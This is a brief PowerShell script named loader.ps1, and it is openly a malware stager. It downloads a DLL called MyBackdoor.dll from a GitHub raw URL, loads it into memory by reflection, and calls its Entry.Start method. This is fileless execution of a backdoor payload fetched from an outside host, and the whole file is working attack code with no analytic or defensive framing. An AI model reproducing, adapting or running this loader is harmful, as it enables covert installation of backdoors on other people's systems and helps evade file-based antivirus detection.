# loader.ps1

# 1) Download the raw DLL bytes
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
Write-Host "[+] Downloading payload from $payloadUrl"
$dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)

# 2) Load the assembly into PowerShell’s AppDomain
Write-Host "[+] Loading assembly in-memory"
$assembly = [System.Reflection.Assembly]::Load($dllBytes)

# 3) Invoke its static Entry.Start() method
Write-Host "[+] Invoking payload entry point"
$entryType = $assembly.GetType("MyBackdoor.Entry")
if (-not $entryType) { throw "Entry type not found" }
$startMethod = $entryType.GetMethod("Start",[Reflection.BindingFlags] "Public,Static")
if (-not $startMethod) { throw "Start method not found" }
$startMethod.Invoke($null, @())

Write-Host "[+] Payload started"
